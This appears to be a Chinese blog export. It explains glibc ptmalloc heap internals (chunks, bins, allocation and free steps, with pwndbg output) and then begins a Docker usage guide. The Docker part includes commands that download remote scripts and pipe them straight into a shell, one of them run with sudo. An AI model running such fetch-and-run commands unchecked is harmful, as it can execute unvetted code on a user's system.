<p>在程序线程较多的情况下，锁等待的时间就会延长，导致 malloc 性能下降。一次加锁操作需要消耗 100ns 左右，正是锁的缘故，导致 ptmalloc 在多线程竞争情况下性能远远落后于 tcmalloc。</p>
<p>arena的数量由系统的核数量决定：</p>
<blockquote>
<p>32位系统：<br>arena 的数量 = 2 <em> 核的数量<br>64位系统：<br>arena 的数量 = 8 </em> 核的数量</p>
</blockquote>
<p>一个多线程（主线程+3个用户线程）应用在一个单核的32位系统上运行，线程数 &gt; 2*核数，因此  malloc 需要确保 arena 能被线程共享。</p>
<blockquote>
<p>a) 主线程第一次调用 malloc 时创建 main arena；<br>b) thread1 和thread2 第一次调用 malloc 时，分别为它们创建 thread arena；<br>c) thread3 第一次调用 malloc 时 arena 已达上限，所以只能重用已存在的 arena（main arena、arena1 或 arena2. ；<br>重用 arena 过程：<br>遍历所有 arena，当找到可用的 arena 时，尝试 lock arena。如果 lock 成功，将 arena 返回给用户；如果没有空闲的 arena，阻塞排队等待 arena。</p>
</blockquote>
<h2 id="2-chunk"><a href="#2-chunk" class="headerlink" title="2. chunk"></a>2. chunk</h2><p>逻辑上划分的一小块内存，根据作用不同分为4类：Allocated chunk、Free chunk、Top chunk、Last Remainder chunk。<br>chunk 结构的定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></div><div class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></div><div class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></div><div class="line"></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></div><div class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>chunk 结构中各字段的含义如下：<br><strong>prev_size：</strong> 如果前一个 chunk 是空闲状态，则该字段保存前一个 chunk 的大小。如果前一个 chunk 被分配使用，那么该字段保存前一个 chunk 的用户数据。<br><strong>size：</strong> 该字段为整个 chunk 的大小，包括保存用户数据的部分和 malloc_chunk 结构大小，并且包含进行内存对齐时填充字节的大小。由于内存按8字节对齐，所以该字段的低3位不用于表示 size，用于表示以下状态信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">bit0 — PREV_INUSE (P)：前一个 chunk 被分配使用时为1；</div><div class="line">bit1 — IS_MMAPPED (M)：当此 chunk 是由 mmap() 创建则为1；</div><div class="line">bit2 — NON_MAIN_ARENA (N)：如果此 chunk 属于 non main arena 则为1。</div></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></div><div class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span></div><div class="line"></div><div class="line"><span class="comment">/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></div><div class="line"><span class="comment">/* check for mmap()'ed chunk */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></div><div class="line"></div><div class="line"><span class="comment">/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained</span></div><div class="line">   from a non-main arena.  This is only set immediately before handing</div><div class="line">   the chunk to the user, if necessary.  */</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></div><div class="line"><span class="comment">/* check for chunk from non-main arena */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></div></pre></td></tr></table></figure>
<p><strong>fd：</strong> 在空闲 chunk 中指向相同 bin 里的后一个 chunk，在已分配的 chunk 中用于保存用户数据。<br><strong>bk：</strong> 在空闲 chunk 中指向相同 bin 里的前一个 chunk，在已分配的 chunk 中用于保存用户数据。</p>
<p><strong>a）Allocated chunk</strong><br>Allocated chunk 结构图如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Size of previous chunk                            |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Size of chunk, in bytes                     |N|M|P|</div><div class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             User data starts here...                          .</div><div class="line">            .                                                               .</div><div class="line">            .             (malloc_usable_space() bytes)                     .</div><div class="line">            .                                                               |</div><div class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Size of chunk                                     |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div></pre></td></tr></table></figure></p>
<p>chunk 指针指向一个 chunk 的开始，mem 指针为真正返回给用户的内存指针。</p>
<p>malloc chunk 的空间复用机制使得 Allocated chunk 会占用下一个 chunk 的 prev_size，这样能提高内存空间利用率。例如，用户使用 malloc(42) 申请 42 字节内存，那么最终分配的 allocated chunk 的 size 为 48。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">len = 42(用户请求) + 8(prev_size/size) - 4(复用next chunk prev_size) = 46</div><div class="line">size = Align(len, 8) = 48</div></pre></td></tr></table></figure></p>
<p><strong>b）Free chunk</strong><br>Free chunk 结构图如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Size of previous chunk                            |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">    `head:&apos; |             Size of chunk, in bytes                         |P|</div><div class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Forward pointer to next chunk in list             |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Back pointer to previous chunk in list            |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Unused space (may be 0 bytes long)                .</div><div class="line">            .                                                               .</div><div class="line">            .                                                               |</div><div class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">    `foot:&apos; |             Size of chunk, in bytes                           |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div></pre></td></tr></table></figure></p>
<p><strong>c）Top chunk</strong><br>堆内存是从低地址向高地址进行分配的，在堆内存的最高处，必然存在着一块空闲 chunk，叫做 top  chunk。当 bins 和 fast bins 中的 chunk 都不能满足分配需要的时候，malloc 会在 top chunk 中分出一块内存给用户。</p>
<p>不论 top chunk 有多大，它都不会被放到 fast  bins 或者是 bins 中。top  chunk 的大小是随着分配和回收不停变换的，如果从 top  chunk 分配内存会导致 top  chunk 减小，同时 top chunk 的指针增大；如果回收的 chunk 恰好与 top chunk 相邻，那么回收的 chunk 就会合并到 top chunk 中，从而使 top chunk 变大，top chunk 的指针减小。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">+---------------------+   &lt;--first chunk ptr</div><div class="line">|     prev_size       |</div><div class="line">+---------------------+</div><div class="line">|        size         |          </div><div class="line">+---------------------+   &lt;--first mem                  </div><div class="line">|                     |</div><div class="line">|     allocated       |         </div><div class="line">|      chunk          |      </div><div class="line">+---------------------+   &lt;--second chunk ptr                </div><div class="line">|      prev_size      |         </div><div class="line">+---------------------+                     </div><div class="line">|        size         |         </div><div class="line">+---------------------+   &lt;--second mem              </div><div class="line">|     Allocated       |         </div><div class="line">|       chunk         |     </div><div class="line">+---------------------+   &lt;-- top                  </div><div class="line">|     prev_size       |            </div><div class="line">+---------------------+                     </div><div class="line">|    size=0x205d1     |           </div><div class="line">+---------------------+                      </div><div class="line">|                     |</div><div class="line">|        TOP          |   </div><div class="line">|       CHUNK         |    </div><div class="line">|                     |</div><div class="line">+---------------------+</div></pre></td></tr></table></figure>
<p>例如，先申请两个大小为 89 的 chunk，然后释放第二个 chunk。释放后的 chunk 将会与 top chunk 合并，使得 top chunk 增大，同时 chunk 指针减小。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-10-24/1257914.jpg" alt=""></p>
<p><strong>d） Last Remainder chunk</strong><br>Last remainder 与 top chunk 一样，不会在任何 bins 中找到这种 chunk。当需要分配一个 small chunk，但在 small bins 中找不到合适的 chunk 时，如果 last remainder chunk 大于所需的 small chunk，last remainder chunk 被分成两个 chunk，其中一个 chunk 返回给用户，另一个 chunk 变成新的 last remainder chuk。</p>
<h2 id="3-Bin"><a href="#3-Bin" class="headerlink" title="3. Bin"></a>3. Bin</h2><p>用户 free 掉的内存并不会马上归还给系统，malloc 会统一管理 heap 和 mmap 映射区域中的空闲 chunk，当用户进行下一次分配请求时，malloc 会首先试图在空闲 chunk 中挑选一块给用户，这样就避免了频繁的系统调用，降低了内存分配的开销。</p>
<p>用于保存 free chunk 链表表头信息的指针数组称为 bin，按所悬挂链表的类型可以分为4类：Fast bin、Unsorted bin、Small bin、Large bin。保存 bin 的数据结构为 fastbinsY 和 bins 两个数组：fastbinsY 数组保存 fast bin，bins 数组保存 unsorted、small 和 large bin，总共有 126 个 bin：Bin 1 为 Unsorted bin、Bin 2 to Bin 63 为 Small bin、Bin 64 to Bin 126 为 Large bin。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-10-24/55042966.jpg" alt=""></p>
<p><strong>Fast Bin</strong><br>fast chunk 的大小为16~64 bytes 的 chunk，保存 fast chunk 的 bin 被称为 fast bin，fast bin 在内存中分配和回收的速度最快。</p>
<p>小于64 bytes 的 chunk 被释放后，会被放到 fast bins 中。fast  bins 中的 chunk 并不改变它的使用标志 P，所以就无法进行合并。当需要分配的 chunk 小于或等于64 bytes 时，malloc 首先会在 fast  bins 中查找相应的空闲块，若没有找到合适的 chunk 再去查找 bins 中的空闲 chunk。fast bin 具有以下特点：</p>
<blockquote>
<p>a) bin 的数量：总共10 个，每个 fast bin 包含一个 free chunk 的单向链表，单项链表的增加和删除都在链表头（LIFO）。<br>b) Chunk size：不同 bin 中 chunk 大小以8字节递增，同一个 fast bin 的 chunk大小相同。例如，第一个 fast bin 的 chunk为16字节；第二个 fast bin 的 chunk 为24字节，以此类推。在 malloc 初始化阶段，fast bin 最大64字节，因此默认 16~64 字节的 chunk是 fast chunk。<br>c) 不合并：两个相邻的 free chunk 不会合并，虽然会产生更多碎片，但是 free 的速度提高了。</p>
</blockquote>
<p>例如，申请3个大小为 0x30（size 为 0x41. 的 chunk，然后将 2-1-3 的顺序将其释放，结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; heap                                                                                                                              [5/1809]</div><div class="line">Top Chunk: 0x804c078</div><div class="line">Last Remainder: 0</div><div class="line"></div><div class="line">0x804c000 FASTBIN &#123;</div><div class="line">  prev_size = 0,</div><div class="line">  size = 41,</div><div class="line">  fd = 0x804c028,</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line">0x804c028 FASTBIN &#123;</div><div class="line">  prev_size = 0,</div><div class="line">  size = 41,</div><div class="line">  fd = 0x0,</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line">0x804c050 FASTBIN &#123;</div><div class="line">  prev_size = 0,</div><div class="line">  size = 41,</div><div class="line">  fd = 0x804c000,</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line">0x804c078 PREV_INUSE &#123;</div><div class="line">  prev_size = 0,</div><div class="line">  size = 135049,</div><div class="line">  fd = 0x0,</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line"></div><div class="line">pwndbg&gt; fastbins</div><div class="line">fastbins</div><div class="line">0x10: 0x0</div><div class="line">0x18: 0x0</div><div class="line">0x20: 0x0</div><div class="line">0x28: 0x804c050 —▸ 0x804c000 —▸ 0x804c028 ◂— 0x0</div><div class="line">0x30: 0x0</div><div class="line">0x38: 0x0</div><div class="line">0x40: 0x0</div></pre></td></tr></table></figure></p>
<p>从以上结果可看出，释放时将 chunk 添加到链表的表头，释放后的 fast chunk 的 P 标识位仍为 1，从而避免了空闲堆块的合并。</p>
<p><strong>Unsorted Bin</strong><br>当 small 或 large chunk 释放后，不会立即把它们加到对应的 bin，而是加到 unsorted bin 中。这样能使 malloc 重用最近释放的 chunk，减少查找合适 bin 的时间，使内存的分配和回收速度得到提高。</p>
<p>在进行 malloc 操作时，如果在 fast bins 中没有找到合适的 chunk，malloc 会先在 unsorted bin 中查找合适的空闲 chunk，然后才查找 bins。如果 unsorted bin 不能满足分配要求，malloc 便会将 unsorted bin 中的 chunk 加入对应的 bins 中。因此，unsorted bin 可以看做是 bins 的一个缓冲区，它能加快内存分配的速度。Unsorted Bin 的特点如下：</p>
<blockquote>
<p>a）bin 的数量：只有1个。<br>b）循环双向链表：unsorted bin 包含一个 free chunk 的循环双向链表。链表的增加在表头位置，找到合适大小的 chunk 即可删除。<br>c）Chunk size：没有大小限制。</p>
</blockquote>
<p><strong>Small Bin</strong><br>small chunk 小于512字节，保存 small chunk 的 bin 称为 small bin。small bin 的分配与回收比 large bin 快，但比 fast bin 慢。它有以下特点：</p>
<blockquote>
<p>a）bin 的数量：总共有62个 small bin。<br>b）循环双向链表：small bin 包含free chunk 的循环双向链表，双向链表的增加在表头，删除在末尾（FIFO）。<br>c）Chunk Size：不同 bin 中 chunk 大小以8字节递增。同一个 small bin 里的 chunk 大小相同。例如，第一个 small bin（Bin 2. chunk 的大小为16字节；第二个 smallbin（Bin 3. chunk 的大小为24字节，以此类推。<br>d）合并：两个相邻的 free chunk 会合并。合并可减少碎片，但会使 free 速度减慢。</p>
</blockquote>
<p><strong>Large Bin</strong><br>large chunk 的大小大于或等于 512，保存 large chunk 的 bin 称为 large bin。它有以下特点：</p>
<blockquote>
<p>a）bin 的数量：总共有63个 large bin。<br>b）循环双向链表：large bin 包含一个 free chunk 的循环双向链表，chunk 的增加和删除可以在链表的任何位置。<br>c）合并：两个相邻的 free chunk 会合并。</p>
</blockquote>
<p>当空闲的 chunk 被链接到 bin 中时，malloc 会把表示该 chunk 是否处于使用中的标志 P 设为 0（该标志在下一个 chunk 的 size中），同时 malloc 还会检查它前后的 chunk 是否也是空闲的，如果是的话，malloc 会首先把它们合并为一个大的 chunk，然后将合并后的 chunk 放到 unstored bin 中。</p>
<h1 id="0x02-内存分配"><a href="#0x02-内存分配" class="headerlink" title="0x02 内存分配"></a>0x02 内存分配</h1><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>当使用 malloc 申请内存时，malloc 的具体过程如下：</p>
<ol>
<li>获取一个未加锁的分配区，如果所有分配区都加了锁，ptmalloc 会开辟一个新的分配区。开辟新分配区时，会调用 mmap 创建一个 sub-heap，并设置好 top chunk。    </li>
<li>将用户的请求大小转换为实际需要分配的 chunk 空间大小。       </li>
<li>判断所需分配 chunk 的大小是否在 fast chunk 中。若是，则转下一步，否则跳到第 5 步。<br>4）首先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。如果可以找到，则分配结束，否则转到下一步。<br>5）判断所需大小是否处在 small  bins 中，若是，则转下一步，否则转到第 7 步。<br>6）根据所需分配的 chunk 的大小，找到对应的 small bin，从该 bin 的尾部摘取一个恰好满足大小的 chunk。若成功，则分配结束，否则，转到下一步。<br>7）首先将 fast bins 中的 chunk 合并，并且放入 unsorted bin 中。如果需要分配的 chunk 属于 small bins，unsorted bin 中只有一个 chunk，并且该 chunk 的大小大于等于需要分配的大小。此时将该 chunk 进行切割，分配结束。否则，将 unsorted bin 中的 chunk 放入 small bins 或者 large bins。进入下一步。<br>8）从 large bins 中按照 “smallest-first，best-fit” 原则找一个合适的 chunk，从中划分一块所需大小的 chunk，并将剩下的部分链接回到 bins 中。若操作成功，则分配结束，否则转到下一步。<br>9）判断 top chunk 大小能否满足所需 chunk 的大小，如果能，则从 top chunk 中分配内存。否则转到下一步。<br>10）判断所需分配的 chunk 大小是否大于等于 mmap 分配阈值，如果是，则转下一步，调用 mmap 分配，否则跳到第 12 步。    </li>
<li>使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。    </li>
<li>如果是主分配区，调用 sbrk()，增加 top chunk 大小；如果是非主分配区，调用 mmap 来分配一个新的 sub-heap，增加 top chunk 大小。    </li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>1. 小内存</strong><br> [获取分配区(arena)并加锁] -&gt; fast bins -&gt; small bins -&gt; 合并 fast bins 加入unsorted bins -&gt; unsorted bins -&gt; large bins -&gt; 增大 top chunk（低于 mmap 阈值） -&gt; mmap（高于 mmap 阈值）。</p>
<p><strong>2. 大内存</strong><br>直接 mmap。</p>
<h1 id="0x03-内存回收"><a href="#0x03-内存回收" class="headerlink" title="0x03 内存回收"></a>0x03 内存回收</h1><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>释放堆内存时根据 chunk 所处的位置和该 chunk 的大小采取不同的方法。free() 函数的具体步骤如下：    </p>
<ol>
<li>首先需要获取分配区的锁，保证线程安全。    </li>
<li>判断传入的指针是否为 0，如果为 0，则直接 return。否则转下一步。    </li>
<li>判断所需释放的 chunk 是否为 mmaped chunk，如果是，则调用 munmap() 释放，解除内存空间映射，该该空间不再有效。<br>4）判断 chunk 的大小和所处的位置，若为 fast chunk，则转到下一步，否则跳到第 6 步。<br>5）将 chunk 放到 fast bins 中，并且不修改该 chunk 使用状态位 P，也不与相邻的 chunk 进行合并。释放结束。<br>6）判断前一个 chunk 的使用状态，如果是空闲块，则合并。并转下一步。<br>7）判断当前释放 chunk 的下一个块是否为 top chunk，如果是，则转第 9 步，否则转下一步。<br>8）判断下一个 chunk 的使用状态，如果是空闲块，则合并，并将合并后的 chunk 放到 unsorted bin 中。并转到第 10 步。<br>9）释放的 chunk 与 top chunk 相邻，将它与 top chunk 合并，并更新 top chunk 的大小等信息。转下一步。<br>10）判断合并后的 chunk 的大小是否大于 FASTBIN_CONSOLIDATION_THRESHOLD（默认64KB），如果是，则会触发 fast bins 的合并操作，fast bins 中的 chunk 将被遍历，并与相邻的空闲 chunk 进行合并，合并后的 chunk 会被放到 unsorted bin 中。操作完成后转下一步。    </li>
<li>判断 top chunk 的大小是否大于 mmap 收缩阈值（默认为 128KB），如果是，对于主分配区，则会归还 top chunk 中的一部分给操作系统。但是会保留最先分配的 128KB 的空间，用于响应用户的分配请求；如果为非主分配区，会进行 sub-heap 收缩，将 top chunk 的一部分返回给操作系统，如果 top chunk 为整个 sub-heap，会把整个 sub-heap 还回给操作系统。释放结束，从 free() 函数退出。    </li>
</ol>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p><strong>1. 大内存</strong><br>直接 munmap。</p>
<p><strong>2. 小内存</strong><br>fast chunk：放入 fast bin -&gt; top chunk 相邻：与 top chunk 合并 -&gt; small chunk、large chunk：与前后的 free chunk 合并后放到 unsorted bin中 -&gt; 如果合并后的 chunk 大于 64KB 则触发合并 fast bin 操作，合并fast bin放到 unsorted 中 -&gt; top chunk 大小达到 mmap 收缩阈值，则将部分 top chunk 的内存归还给系统。</p>
<hr>
<p>References:<br>[1] glibc内存管理ptmalloc源代码分析<br>[2] <a href="http://pwn4.fun/2016/04/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3glibc-malloc/" target="_blank" rel="external">深入理解glibc malloc</a><br>[3] <a href="http://blog.csdn.net/maokelong95/article/details/52006379" target="_blank" rel="external">glibc内存分配与回收过程图解</a><br>[4] <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/?spm=a313e.7916648.0.0.123608f8erhuwJ" target="_blank" rel="external">Understanding glibc malloc</a></p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 内存管理 </tag>
            
            <tag> malloc </tag>
            
            <tag> 堆 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Docker 使用笔记]]></title>
      <url>/2017/1005/docker-notes/</url>
      <content type="html"><![CDATA[<p>Docker是一个开源项目，诞生于 2013 年初，最初是 dotCloud 公司内部的一个业务项目。它基于 Google 公司推出的 Go 语言实现。项目后来加入 Linux 基金会，遵从了 Apache 2.0 协议，项目代码在 GitHub 上进行维护。</p>
<p>Docker 项目的目标是实现轻量级的操作系统虚拟化解决方案，Docker 的基础是 Linux 容器 (LXC) 等技术。在 LCX 的基础上 Docker 进行了进一步的封装，让用户不需要关心容器的管理，使得操作更为简便，用户操作 Docker 的容器就像操作一个快速轻量级的虚拟机一样。</p>
<p>以下为 Docker 的基本功能使用记录。</p>
<h1 id="0x01-安装-Docker"><a href="#0x01-安装-Docker" class="headerlink" title="0x01 安装 Docker"></a>0x01 安装 Docker</h1><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><p>在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Ubuntu 系统上可以使用这套脚本安装：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl -fsSL get.docker.com -o get-docker.sh</div><div class="line">$ sudo sh get-docker.sh --mirror Aliyun</div></pre></td></tr></table></figure></p>
<h2 id="2-镜像加速器"><a href="#2-镜像加速器" class="headerlink" title="2. 镜像加速器"></a>2. 镜像加速器</h2><p>国内访问 Docker Hub 有时会遇到困难，此时可以配置镜像加速器。使用国内云服务商 DaoCloud 提供的加速器服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxx.m.daocloud.io</div></pre></td></tr></table></figure></p>
<p>该脚本可以将 –registry-mirror 加入到 Docker 配置文件 /etc/docker/daemon.json 中。适用于 Ubuntu14.04、Debian、CentOS6 、CentOS7、Fedora、Arch Linux、openSUSE Leap 42.1，其他版本可能有细微不同。    </p>
<p>重新启动服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo service docker restart</div></pre></td></tr></table></figure></p>
<p>配置完加速器需要检查是否生效，如果 Docker 版本大于 1.13 或 17.05.0-ce，可以使用以下命令检查。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker info|grep <span class="string">"Registry Mirrors"</span> -A <span class="number">1</span></div><div class="line">Registry Mirrors:</div><div class="line"> http://xxx.m.daocloud.io/</div><div class="line">WARNING: No swap limit support</div></pre></td></tr></table></figure></p>
<h1 id="0x02-镜像"><a href="#0x02-镜像" class="headerlink" title="0x02 镜像"></a>0x02 镜像</h1><p>对于 Linux 而言，内核启动后，会挂载 root 文件系统为其提供用户空间支持。而 Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:14.04 就包含了完整的一套 Ubuntu 14.04 最小系统的 root 文件系统。</p>
<p>Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p>
<h2 id="1-获取镜像"><a href="#1-获取镜像" class="headerlink" title="1. 获取镜像"></a>1. 获取镜像</h2><p>从 Docker Registry 获取镜像的命令是 docker pull。其命令格式为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull [选项] [Docker Registry地址]&lt;仓库名&gt;:&lt;标签&gt;</div></pre></td></tr></table></figure></p>
<p>Docker Registry地址：地址的格式一般是 &lt;域名/IP&gt;[:端口号]。默认地址是 Docker Hub。<br>仓库名：仓库名是两段式名称，即 &lt;用户名&gt;/&lt;软件名&gt;。对于 Docker Hub，如果不给出用户名，则默认为 library，也就是官方镜像。如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker pull ubuntu:<span class="number">14.04</span>                                                                                                        </div><div class="line"><span class="number">14.04</span>: Pulling <span class="keyword">from</span> library/ubuntu</div><div class="line">bae382666908: Pull complete</div><div class="line"><span class="number">29</span>ede3c02ff2: Pull complete</div><div class="line">da4e69f33106: Pull complete</div><div class="line"><span class="number">8</span>d43e5f5d27f: Pull complete</div><div class="line">b0de1abb17d6: Pull complete</div><div class="line">Digest: sha256:<span class="number">6e3</span>e3f3c5c36a91ba17ea002f63e5607ed6a8c8e5fbbddb31ad3e15638b51ebc</div><div class="line">Status: Downloaded newer image <span class="keyword">for</span> ubuntu:<span class="number">14.04</span></div></pre></td></tr></table></figure></p>
<p>上面的命令中没有给出 Docker Registry 地址，而镜像名称是 ubuntu:14.04，因此将会获取官方镜像 library/ubuntu 仓库中标签为 14.04 的镜像。</p>
